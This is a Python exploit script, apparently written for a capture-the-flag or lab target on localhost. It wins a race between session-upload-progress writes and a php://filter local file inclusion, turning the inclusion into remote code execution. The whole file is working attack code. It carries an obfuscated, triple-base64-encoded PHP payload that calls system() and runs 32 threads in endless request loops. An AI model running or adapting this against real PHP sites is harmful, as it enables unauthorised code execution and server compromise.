import sys
import string
import requests
from base64 import b64encode
from random import sample, randint
from multiprocessing.dummy import Pool as ThreadPool



HOST = 'http://127.0.0.1:1337/'
sess_name = 'riven'

headers = {
    'Connection': 'close', 
    'Cookie': 'PHPSESSID=' + sess_name
}

payload = "VVVSM0wyTkhhSGRKU0U0MVl6TlNiR0pUWjJsa1J6a3hXVEpuWjB3elVuUmpRemwzWkRJMWJGcEROVEJsU0ZGcFMxUnpaMUI2Tld0WFJUbFlaV3hTYWxkc1RsRlJNMVo1"

def runner1(i):
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS': 'ZZ' + payload + 'Z'
    }
    while 1:
        fp = open('big.txt', 'rb')
        r = requests.post(HOST, files={'f': fp}, data=data, headers=headers)
        fp.close()

def runner2(i):
    filename = '/var/lib/php/sessions/sess_' + sess_name
    filename = 'php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s' % filename
    while 1:
        url = '%s?file=%s' % (HOST, filename)
        r = requests.get(url, headers=headers)
        c = r.content

if sys.argv[1] == '1':
    runner = runner1
else:
    runner = runner2

pool = ThreadPool(32)
result = pool.map_async( runner, range(32) ).get(0xffff)
